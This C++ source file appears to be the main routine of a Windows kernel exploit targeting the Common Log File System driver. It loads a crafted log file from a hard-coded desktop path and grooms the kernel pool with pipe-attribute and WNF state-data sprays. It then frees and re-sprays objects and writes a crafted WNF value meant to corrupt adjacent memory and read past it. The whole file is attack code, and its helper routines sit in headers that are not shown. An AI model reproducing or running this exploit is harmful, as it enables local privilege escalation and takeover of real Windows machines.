#pragma warning (disable : 4005)

#include <stdio.h>
#include <iostream>
#include <windows.h>
#include <clfsw32.h>
#include <ntstatus.h>
#include <processthreadsapi.h>
#include <tchar.h>
#include <tlhelp32.h>
#include "crc32.h"  
#include "head.h"  
#include "ntos.h"  
#include "spray.h"
#include "windows_api.h"
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Clfsw32.lib")

int main() {
	InitEnvironment();
	sprayPipeAttributes();

	// open crafted base log file
	std::wstring logFileName = L"LOG:";
	std::wstring inputName = L"C:\\Users\\vuduc\\Desktop\\mal";
	logFileName += inputName;
	HANDLE hLogFile = CreateLogFile(logFileName.c_str(), 0xc0010000, 3, 0, 4, 0);
	if (hLogFile == INVALID_HANDLE_VALUE) {
		printf("CreateLogFile failed with error %d\n", GetLastError());
		return 1;
	}
	else {
		printf("[+] Log file created successfully.\n");
	}
	sprayWNF(PadStateNames1, StateNames1, 'A');
	// Close the log file handle
	CloseHandle(hLogFile);
	sprayWNF(PadStateNames2, StateNames2, 'B');
	freeWNF(PadStateNames1, StateNames1);
	sprayWNF2(PadStateNames3, StateNames3);
	BYTE* value = (BYTE*)malloc(0x1000);
	if (value == NULL) {
		printf("[-] Memory allocation failed!\n");
		return 1;
	}
	memset(value, 0x45, 0x1000); 
	uint32_t v1 = 0x00100904;
	uint32_t v2 = 0x7000;
	uint32_t v3 = 0x7000;
	uint32_t v4 = 0x00000001;

	memcpy(&value[0], &v1, 4);
	memcpy(&value[4], &v2, 4);
	memcpy(&value[8], &v3, 4);
	memcpy(&value[12], &v4, 4);

	updateWNF(PadStateNames2, StateNames2, value);
	getchar();
	readWNF(PadStateNames3, StateNames3);
	getchar();

}